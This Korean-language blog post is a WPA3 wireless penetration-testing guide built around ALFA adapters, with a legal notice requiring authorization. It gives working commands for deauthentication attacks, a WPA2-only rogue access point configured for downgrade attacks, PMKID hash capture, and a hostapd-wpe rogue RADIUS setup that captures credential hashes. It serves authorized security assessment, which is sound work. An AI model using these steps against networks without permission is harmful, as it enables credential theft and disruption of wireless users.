---
title: "ALFA 어댑터로 하는 WPA3 보안 테스트 (2026)"
description: "ALFA Network 어댑터를 사용한 WPA3 보안 테스트 종합 가이드. SAE 핸드셰이크 분석, Dragonblood 취약점, 전환 모드 다운그레이드 공격, PMF 강제, WPA3-Enterprise EAP 테스트를 다룹니다."
date: 2026-03-24
author: "benny-lai"
lastmod: 2026-11-20
faq:
  - question: "보안 테스트에서 WPA3는 WPA2와 어떻게 다른가요?"
    answer: "WPA3는 PSK 대신 SAE 핸드셰이크를 사용해 순방향 비밀성과 오프라인 사전 공격 저항성을 제공합니다. PMF가 필수이지만, 전환 모드는 다운그레이드 공격 표면을 도입합니다."
  - question: "SAE 핸드셰이크 캡처를 오프라인으로 크랙할 수 있나요?"
    answer: "불가능합니다. 순수 SAE 네트워크는 크랙 가능한 해시를 생성하지 않습니다. SAE 프레임 캡처는 프로토콜 수준 분석, 즉 올바른 변형과 PMF 협상을 확인하는 용도일 뿐입니다."
  - question: "WPA3 전환 모드 다운그레이드 공격이란 무엇인가요?"
    answer: "전환 모드 AP는 SAE와 PSK를 모두 수용합니다. 공격자가 순수 WPA2 Rogue AP를 위장합니다. 클라이언트가 SAE를 강제하지 않으면 다운그레이드가 성공하고 핸드셰이크를 오프라인으로 크랙할 수 있습니다."
  - question: "WPA3를 테스트하려면 6 GHz 어댑터가 필요한가요?"
    answer: "6 GHz 대역의 WPA3 네트워크를 테스트할 때만 필요하며, 이 경우 AWUS036AXML이 필요합니다. 2.4/5 GHz에서의 WPA3 테스트는 AWUS036ACH를 사용합니다."
  - question: "Dragonblood 취약점을 아직도 테스트해야 하나요?"
    answer: "현대 AP 펌웨어는 대부분 패치되었지만, 오래되었거나 패치되지 않은 펌웨어 환경에서는 여전히 CVE-2019-9494 사이드 채널 공격과 SAE commit 플러드 DoS를 테스트해야 합니다."
draft: false
showBreadcrumbs: true
showTableOfContents: true
tags: ["WPA3", "SAE", "dragonblood", "transition-mode", "PMF", "kali-linux", "ALFA-network", "penetration-testing"]
featureimage: "/images/blog/wpa3-security-testing-alfa-2026.webp"
hideFeatureImage: true  # 1024x1024／16:9 原圖在 975x280 框內會裁掉過半，暫不顯示頁面封面；featureimage 保留供社群分享預覽
---

{{< alert "triangle-exclamation" >}}
<strong>법적 고지:</strong> 모든 무선 보안 테스트는 명시적인 서면 허가를 받은 네트워크와 기기에서만 수행해야 합니다. SAE 캡처, 디인증, Rogue AP 배치를 포함한 WPA3 테스트 기법은 다른 무선 평가 활동과 동일한 법적 요건의 적용을 받습니다. 허가된 테스트만 수행하십시오.
{{< /alert >}}

WPA3는 개인 및 기업 무선 보안 모두에서 WPA2에 비해 상당한 개선을 나타냅니다. SAE(Simultaneous Authentication of Equals)는 사전 공유 키(PSK) 핸드셰이크를 오프라인 사전 공격에 저항하는 비밀번호 인증 키 교환으로 대체합니다. 보호 관리 프레임(PMF)이 필수입니다. 순방향 비밀성이 기본 내장되어 있습니다.

{{< tldr >}}
WPA3 보안 테스트는 SAE 핸드셰이크 분석, 전환 모드 다운그레이드 공격, Dragonblood 취약점 평가, PMF 강제를 다룹니다. AWUS036AXML은 6 GHz 테스트용입니다. AWUS036ACH는 2.4/5 GHz에 적합합니다.
{{< /tldr >}}





그러나 WPA3에도 취약점이 없는 것은 아닙니다. Dragonblood 연구(2019)는 SAE 핸드셰이크의 사이드 채널 및 서비스 거부 취약점을 밝혀냈습니다. 전환 모드는 다운그레이드 공격 표면을 도입합니다. 기업 구축은 WPA2-Enterprise와 동일한 802.1X 인증서 검증 약점에 직면합니다. 이 가이드는 철저한 평가에 필요한 모니터 모드 안정성과 인젝션 기능을 제공하는 ALFA Network 어댑터를 사용한 완전한 WPA3 보안 테스트 방법론을 다룹니다.

---

## 보안 테스터를 위한 WPA3 기초

### SAE: Simultaneous Authentication of Equals

SAE는 WPA2-PSK의 4-way 핸드셰이크를 Dragonfly 키 교환 프로토콜 기반의 영지식 증명 교환으로 대체합니다. 보안 테스트에서 중요한 핵심 속성은 <strong>순방향 비밀성</strong>입니다. Wi-Fi 비밀번호가 나중에 유출되더라도 이전에 캡처한 트래픽은 복호화할 수 없습니다. 이로써 SAE 전용 네트워크에 대한 오프라인 패스프레이즈 크래킹의 주된 가치가 사라집니다.

SAE는 또한 WPA2에 영향을 주던 PMKID 공격 취약성을 제거합니다. 수동적 공격자가 SAE 연결에서 추출할 수 있는, 오프라인으로 크랙 가능한 동등 산출물이 존재하지 않습니다.

### PMF: WPA3에서 필수

802.11w 보호 관리 프레임은 WPA3에서 필수입니다. 디인증 및 연결 해제 프레임이 암호학적으로 보호되어, PMF가 없는 WPA2 네트워크에 쉽게 통하는 위조 deauth 공격을 방지합니다. WPA3 전용 네트워크는 디인증 기반 핸드셰이크 캡처 가속에 면역이어야 합니다.

### WPA3 전환 모드

현실에서 가장 흔한 구축 시나리오는 <strong>WPA3 전환 모드(Transition Mode)</strong>입니다. AP가 WPA3를 지원하지 않는 기기와의 하위 호환성을 유지하기 위해 WPA3-SAE와 WPA2-PSK 인증을 동시에 수용합니다. 이 모드는 현재 기업 환경에서 주된 공격 표면입니다 — WPA3를 광고하는 네트워크에 WPA2 PSK 핸드셰이크 노출을 다시 들여오기 때문입니다.

### WPA3-Enterprise

WPA3-Enterprise는 GCMP-256과 HMAC-SHA-384를 사용하는 192비트 보안 모드와 인증서 기반 상호 인증을 의무화합니다. 올바르게 배치되지 않으면 WPA2-Enterprise와 동일한 인증서 검증 취약점을 안게 됩니다. 802.1X 계층의 테스트 방법론은 [기업 무선 보안 평가 프레임워크](/ko/blog/enterprise-wireless-security-assessment/)에서 다룹니다.

---

## 테스트 환경 및 어댑터 요구 사항

### 어댑터 선택

WPA3 테스트에는 신뢰할 수 있는 모니터 모드, 인젝션 지원, 그리고 — 6 GHz WPA3 네트워크의 경우 — 트라이밴드 기능을 갖춘 어댑터가 필요합니다.

- <strong>AWUS036AXML</strong> — Wi-Fi 6E(6 GHz) WPA3 네트워크에 필수. MediaTek MT7921AUN 칩셋. 커널 5.18+의 Kali Linux에서 모니터 모드, AP, WPA3 사용 가능. 패킷 인젝션은 커널 6.16 이전에서는 커뮤니티 보고가 있으나 stock kernel 6.17 실측에서는 실패했습니다(mac80211 chanctx 회귀가 주원인이며 칩 자체의 한계는 아닙니다). 인젝션이 필요하면 AWUS036ACH를 사용하세요. WPA3 전용 구축이 점점 흔해지는 6 GHz 채널을 커버하는 유일한 ALFA 어댑터.
- <strong>AWUS036ACH</strong> — 2.4/5 GHz WPA3 테스트에 적합. RTL8812AU 칩셋. aircrack-ng 툴체인과의 최대 호환성, 그리고 Kali Linux 버전 전반에 걸친 가장 폭넓은 드라이버 지원.

### 모니터 모드 활성화

```bash
# 간섭 프로세스 종료
sudo airmon-ng check kill

# 모니터 모드 시작
sudo airmon-ng start wlan0

# 모니터 인터페이스 확인
iwconfig wlan0mon
```

전체 모니터 모드 설정 가이드는 [Kali Linux에서 모니터 모드 활성화](/ko/blog/enable-monitor-mode-kali-linux/)를 참조하십시오.

### 스캔 결과에서 WPA3 네트워크 식별

```bash
# 모든 대역에 걸친 수동 스캔
sudo airodump-ng wlan0mon --band abg -w wpa3_scan

# 결과에서 WPA3 네트워크 필터링
sudo airodump-ng wlan0mon --band abg | grep -i "SAE\|WPA3"
```

airodump-ng 출력에서 WPA3-SAE 네트워크는 AUTH 열에 `WPA3 SAE`로 나타납니다. 전환 모드 네트워크는 `WPA2 WPA3 SAE PSK`로 표시됩니다. Open(OWE) 강화 네트워크는 `OWE`로 표시됩니다.

---

## 1단계: SAE 핸드셰이크 캡처 및 분석

### 수동 캡처의 한계

WPA2와 달리 <strong>SAE 핸드셰이크는 오프라인 사전 공격에 사용할 수 없습니다.</strong> SAE commit 및 confirm 프레임을 캡처하는 것은 어떤 모니터 모드 어댑터로도 간단하지만, 캡처한 자료는 크랙 가능한 해시를 산출하지 않습니다. SAE 프레임을 캡처하는 목적은 프로토콜 수준 분석입니다 — 올바른 SAE 변형이 사용되는지 검증하고, PMF가 협상되는지 확인하며, 평가 보고서에 증거를 제공하기 위함입니다.

```bash
# 대상 AP 채널에서 캡처
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0mon

# Wireshark에서 캡처 분석
# 필터: wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
# (0x000b = 인증 프레임)
wireshark -r sae_capture-01.cap
```

인증 프레임에서 SAE commit 및 confirm 교환을 검증합니다. 비컨 프레임의 RSN 정보 요소(Information Element)는 다음을 보여야 합니다.
- <strong>AKM Suite</strong>: WPA3-Personal의 경우 00-0F-AC:8 (SAE)
- <strong>PMF</strong>: Required (RSN Capabilities에 MFPR 비트 설정됨)

### SAE 네트워크에서의 PMKID 테스트

`hcxdumptool` 같은 도구는 모든 네트워크에서 PMKID 추출을 시도하지만, SAE 네트워크는 크랙 가능한 PMKID를 노출하지 않습니다. WPA2 PMKID 노출이 없음을 확인하기 위해 도구를 실행하는 것은 가치가 있습니다.

```bash
# PMKID 캡처 시도 — SAE 네트워크는 크랙 가능한 PMKID를 산출하지 않아야 함
sudo hcxdumptool -i wlan0mon -o wpa3_pmkid.pcapng --enable_status=3

# 변환 및 검사
hcxpcapngtool -o wpa3_hashes.hc22000 wpa3_pmkid.pcapng

# 비어 있거나 없는 해시 파일은 WPA2 PMKID 노출이 없음을 확인함
wc -l wpa3_hashes.hc22000
```

WPA3 전용으로 광고된 네트워크에 대해 `hcxpcapngtool`이 내용이 채워진 `.hc22000` 파일을 출력한다면, 이는 AP가 전환 모드로 작동하며 WPA2 PMKID를 노출하고 있음을 나타냅니다 — 중대한 발견 사항입니다.

---

## 2단계: 전환 모드 다운그레이드 공격 테스트

### 다운그레이드 공격 표면

WPA3 전환 모드는 현재 기업 환경에서 가장 영향력 있는 WPA3 취약점입니다. AP가 전환 모드로 작동하면 SAE와 PSK 연결을 모두 수용합니다. 클라이언트 프로브 요청을 관찰할 수 있는 공격자는 동일한 SSID에 대해 WPA2-PSK 기능만 제시하는 Rogue AP를 만들 수 있습니다 — 클라이언트가 SAE를 요구하지 않고 연결하면 표준 WPA2 4-way 핸드셰이크가 캡처되어 오프라인으로 공격당할 수 있습니다.

### 테스트 절차

```bash
# 1단계: 대상이 전환 모드인지 확인 (airodump-ng에서 WPA2+WPA3 표시)
sudo airodump-ng wlan0mon --band abg | grep "TARGET_SSID"

# 2단계: 정상 AP의 비컨을 캡처해 채널과 구성 확인
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_recon wlan0mon

# 3단계: hostapd를 사용해 동일 채널에 WPA2 전용 Rogue AP 생성
# /tmp/rogue_wpa2.conf 생성:
cat > /tmp/rogue_wpa2.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
wpa=2
wpa_passphrase=TestPassphrase123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/rogue_wpa2.conf &

# 4단계: Rogue AP에 대한 클라이언트 연결 모니터링
sudo airodump-ng -c 6 --bssid ROGUE_BSSID -w downgrade_capture wlan0mon
```

<strong>중대한 발견 사항:</strong> 이전에 SAE를 통해 연결했던 클라이언트가 WPA2 전용 Rogue AP에 연결된다면(캡처 파일의 4-way 핸드셰이크로 입증됨), 클라이언트 OS가 WPA3-SAE 요구를 강제하지 않는 것입니다. 이는 다운그레이드 공격이 성공했음을 의미합니다.

<strong>통과 조건:</strong> 클라이언트가 WPA2 전용 AP를 무시하거나 경고를 표시하며, WPA2 핸드셰이크를 완료하지 않습니다.

### hcxpcapngtool 출력의 다운그레이드 지표

```bash
# Rogue AP 캡처 변환 — 해시의 존재는 WPA2 연결이 발생했음을 확인
hcxpcapngtool -o downgrade_hash.hc22000 downgrade_capture-01.cap
cat downgrade_hash.hc22000
# 비어 있지 않은 출력 = 다운그레이드 공격 성공
```

---

## 3단계: Dragonblood 취약점 평가

### 배경

Dragonblood 연구(Vanhoef & Ronen, 2019)는 SAE 핸드셰이크 구현의 여러 취약점을 식별했습니다.

- <strong>CVE-2019-9494 / CVE-2019-9496</strong>: SAE commit 프레임에 대한 사이드 채널 공격(캐시 기반 및 타이밍 기반)으로, 패치되지 않은 구현에 대한 오프라인 사전 공격을 허용함
- <strong>CVE-2019-9499</strong>: SAE confirmation 우회로 WPA3-Personal에서 WPA2-PSK로의 다운그레이드를 초래함
- <strong>SAE commit 플러딩을 통한 DoS</strong>: 다수의 SAE commit 프레임을 전송해 AP 상태 테이블을 고갈시킴

대부분의 현대 AP 펌웨어는 원래의 Dragonblood 취약점을 패치했습니다. 그러나 오래되었거나 패치되지 않은 AP 펌웨어 환경에서는 여전히 테스트가 유효합니다.

### SAE Anti-Clogging 토큰 테스트

WPA3-SAE는 commit 플러딩을 통한 DoS를 방지하기 위한 anti-clogging 메커니즘을 포함합니다. 대상 AP가 anti-clogging을 올바르게 구현하는지 테스트합니다.

```bash
# hcxtools 설치
sudo apt install hcxtools

# hcxdumptool로 SAE commit/confirm 프레임 교환 속도 제한 관찰
sudo hcxdumptool -i wlan0mon -o dragonblood_test.pcapng --enable_status=3

# Wireshark에서 인증 프레임을 필터링하고 관찰:
# wlan.fc.type_subtype == 0x000b
# commit 프레임에서 Anti-Clogging Token(ACT) 응답을 찾으십시오
wireshark -r dragonblood_test.pcapng
```

올바르게 구현된 AP에서는 여러 소스 MAC 주소로부터의 빠른 SAE commit 요청이 Anti-Clogging Token 응답을 유발해야 합니다(AP가 후속 commit 프레임에 포함되어야 하는 토큰을 반환함). ACT를 구현하지 않는 AP는 SAE commit 플러딩 DoS에 취약합니다.

### AP 펌웨어 버전 확인

AP 펌웨어 버전은 패치 상태를 강하게 시사하는 지표입니다. 발견된 AP 펌웨어 버전을 벤더 보안 권고와 비교하십시오.

- Cisco: Security Advisory cisco-sa-wpa3-sae-side-channel (2019)
- Aruba: ArubaOS 8.6+에서 Dragonblood 패치
- Ubiquiti: UniFi Network 6.0+에서 Dragonblood 패치
- MikroTik: RouterOS 6.45.7+에서 Dragonblood 패치

평가 보고서에 AP 펌웨어 버전을 문서화하십시오. 이 릴리스 이전의 펌웨어를 구동하는 AP는 적극적 익스플로잇이 확인되지 않았더라도 잠재적으로 취약한 것으로 표시해야 합니다.

---

## 4단계: WPA3 네트워크에서의 PMF 강제 테스트

### PMF 테스트가 여전히 적용되는 이유

PMF가 WPA3에서 필수임에도 실제 강제 동작을 테스트하는 것이 중요한 이유는 다음과 같습니다.

1. 전환 모드 AP는 WPA2 경로에서 PMF를 "required"가 아닌 "capable"로 설정할 수 있어, WPA2로 연결된 클라이언트에 대한 deauth 공격을 허용함
2. AP 구성 오류로 인해 SAE 연결에서조차 PMF가 협상되지 않을 수 있음
3. 클라이언트 구현이 AP가 required로 광고하더라도 PMF를 올바르게 강제하지 않을 수 있음

### 디인증 테스트

```bash
# WPA3-SAE로 연결된 테스트 클라이언트에 대한 deauth 시도
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# 올바르게 구성된 WPA3 네트워크에서의 예상 결과:
# - 테스트 클라이언트가 연결 끊기지 않음 (PMF로 보호된 관리 프레임이 드롭됨)
# - airodump-ng에 핸드셰이크 캡처 없음

# 실패 조건 (발견 사항):
# - 테스트 클라이언트가 끊기고 재연결됨
# - airodump-ng가 새 핸드셰이크를 캡처함
```

### PMF Capable vs. Required

비컨 프레임의 RSN 정보 요소를 확인해 PMF 구성을 확인합니다.

```bash
# 비컨 프레임 캡처 및 RSN IE 디코딩
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr \
  -c 5 2>/dev/null
```

출력 해석:
- `1,1` — PMF Required (MFPR=1, MFPC=1): WPA3에 올바름
- `1,0` — PMF Capable이나 Required 아님: WPA3 네트워크에서는 Medium, 기업 SSID에서는 High 발견 사항
- `0,0` — PMF Disabled: WPA3를 광고하는 모든 네트워크에서 High 발견 사항; AP 구성 오류를 나타냄

---

## 5단계: OWE (Opportunistic Wireless Encryption) 테스트

### OWE 개요

OWE(Wi-Fi Enhanced Open)는 완전히 개방된(암호화되지 않은) 게스트 네트워크를 대체하는 WPA3 방식입니다. OWE는 비밀번호 없이 세션별 암호화를 수립하기 위해 인증되지 않은 Diffie-Hellman 키 교환을 수행합니다. 게스트 네트워크에서 수동적 도청으로부터 보호하지만 인증은 제공하지 않습니다.

### OWE 전환 모드 테스트

많은 AP가 레거시 개방 SSID와 함께 OWE를 전환 모드로 배치합니다(개방 SSID는 숨겨지고 OWE SSID는 보임). 클라이언트가 레거시 개방 SSID에 연결하도록 강제될 수 있는지 테스트합니다.

```bash
# OWE 네트워크와 짝지어진 숨겨진 SSID 스캔
sudo airodump-ng wlan0mon --band abg | grep -E "OWE|\<length: 0\>"

# OWE SSID와 짝지어진, 암호화 없는 숨겨진 SSID가 전환 SSID임
# WPA3를 지원하는 클라이언트는 OWE를 선호해야 하고, 레거시 클라이언트는 개방으로 폴백함
```

<strong>발견 사항:</strong> WPA3 지원 클라이언트가 OWE SSID 대신 개방 전환 SSID에 연결하면, 클라이언트 OS가 OWE 전환 모드를 올바르게 처리하지 못하는 것입니다. 해당 클라이언트의 모든 트래픽은 암호화되지 않습니다.

---

## 6단계: WPA3-Enterprise 평가

### 192비트 보안 모드 검증

WPA3-Enterprise는 192비트 보안 모드에서 GCMP-256 암호화와 HMAC-SHA-384 인증을 의무화합니다. 비컨 프레임의 RSN IE를 통해 검증합니다.

```bash
# 기업 SSID에 대한 RSN IE 캡처 및 디코딩
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.pcs.type -e wlan_mgt.rsn.akms.type \
  -c 10 2>/dev/null
```

WPA3-Enterprise 192비트의 예상 값:
- <strong>Pairwise Cipher Suite</strong>: GCMP-256 (00-0F-AC:9)
- <strong>AKM Suite</strong>: EAP-SHA384 (00-0F-AC:12) 또는 FT-EAP-SHA384 (00-0F-AC:13)

WPA3-Enterprise 네트워크에 CCMP-128이 존재하는 것은 Medium 발견 사항입니다; AP가 192비트 보안 요구를 강제하지 않는 것입니다.

### Rogue RADIUS 테스트

WPA3-Enterprise는 클라이언트가 서버 인증서를 검증하지 않으면 rogue RADIUS 공격에 취약합니다. 테스트 방법론은 WPA2-Enterprise와 동일합니다.

```bash
# hostapd-wpe로 rogue RADIUS를 갖춘 Rogue AP 배치
sudo apt install hostapd-wpe

# 대상 SSID와 채널에 맞게 /etc/hostapd-wpe/hostapd-wpe.conf 편집
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 캡처된 자격 증명 해시 모니터링
```

전체 EAP/RADIUS 테스트 절차는 [기업 무선 보안 평가 프레임워크](/ko/blog/enterprise-wireless-security-assessment/)를 참조하십시오.

---

## WPA3 테스트를 위한 툴킷 참조

<div class="table-nowrap" style="overflow-x: auto;">

| 도구 | 용도 | 어댑터 | 주요 명령어 |
|---|---|---|---|
| airodump-ng | WPA3 네트워크 발견, SAE 프레임 캡처 | AWUS036AXML / AWUS036ACH | `sudo airodump-ng wlan0mon --band abg` |
| hcxdumptool | PMKID/SAE 캡처, 전환 모드 탐지 | AWUS036AXML | `sudo hcxdumptool -i wlan0mon -o out.pcapng --enable_status=3` |
| hcxpcapngtool | 캡처 변환, 전환 모드에서 WPA2 노출 탐지 | 해당 없음 (후처리) | `hcxpcapngtool -o hash.hc22000 cap.pcapng` |
| Wireshark / tshark | RSN IE 분석, PMF 기능, SAE 프레임 검사 | 모두 (캡처 파일 경유) | `tshark -i wlan0mon -T fields -e wlan_mgt.rsn.capabilities.mfpr` |
| aireplay-ng | PMF 강제 테스트 (deauth) | AWUS036ACH | `sudo aireplay-ng --deauth 10 -a BSSID wlan0mon` |
| hostapd | 다운그레이드 테스트용 WPA2 전용 Rogue AP | AWUS036ACH | `sudo hostapd /tmp/rogue_wpa2.conf` |
| hostapd-wpe | WPA3-Enterprise EAP 테스트용 Rogue RADIUS | AWUS036ACH | `sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf` |

</div>

---

## WPA3 평가의 발견 사항 요약

| ID | 심각도 | 발견 사항 | 조건 |
|---|---|---|---|
| W3-01 | Critical | WPA3에서 WPA2로의 다운그레이드 성공; 핸드셰이크 캡처 및 크랙 가능 | 클라이언트가 WPA2 전용 Rogue AP에 연결; 해시 복구됨 |
| W3-02 | High | SAE 강제 없는 전환 모드; WPA2 PMKID 노출됨 | hcxpcapngtool이 WPA3 네트워크에서 크랙 가능한 해시 반환 |
| W3-03 | High | WPA3 SSID에서 PMF 미강제; deauth 공격 성공 | aireplay-ng deauth로 테스트 클라이언트 끊김 |
| W3-04 | High | WPA3-Enterprise 클라이언트가 인증서 경고 없이 rogue RADIUS 수용 | hostapd-wpe가 테스트 클라이언트로부터 EAP 자격 증명 캡처 |
| W3-05 | Medium | WPA3 SSID에서 PMF Capable이나 Required 아님 | RSN IE에 MFPC=1, MFPR=0 표시 |
| W3-06 | Medium | WPA3-Enterprise가 192비트 보안 모드 미사용 | RSN IE에 GCMP-256 대신 CCMP-128 표시 |
| W3-07 | Medium | AP 펌웨어가 Dragonblood 패치 이전 버전 | 벤더 권고 대비 펌웨어 버전 비교 |
| W3-08 | Low | OWE 전환 모드; 레거시 클라이언트가 암호화 없이 연결 | OWE SSID와 함께 개방 SSID 노출 |

---

{{< faq >}}

## 관련 자료

- [기업 무선 보안 평가: 완전한 프레임워크](/ko/blog/enterprise-wireless-security-assessment/)
- [패킷 인젝션 가이드: aireplay-ng로 WiFi 어댑터 테스트하기](/ko/blog/packet-injection-guide/)
- [Kali Linux에서 모니터 모드 활성화](/ko/blog/enable-monitor-mode-kali-linux/)

## 참고 문헌

1. [Dragonblood 연구 논문 (Vanhoef and Ronen, 2019)](https://papers.mathyvanhoef.com/dragonblood.pdf)
2. [Wi-Fi Alliance WPA3 인증](https://www.wi-fi.org/discover-wi-fi/wpa3)
3. [aircrack-ng 공식 문서](https://www.aircrack-ng.org/documentation.html)
4. [hcxdumptool 도구 문서](https://github.com/ZerBea/hcxdumptool)
5. [IEEE 802.11w PMF 표준](https://standards.ieee.org/ieee/802.11/)
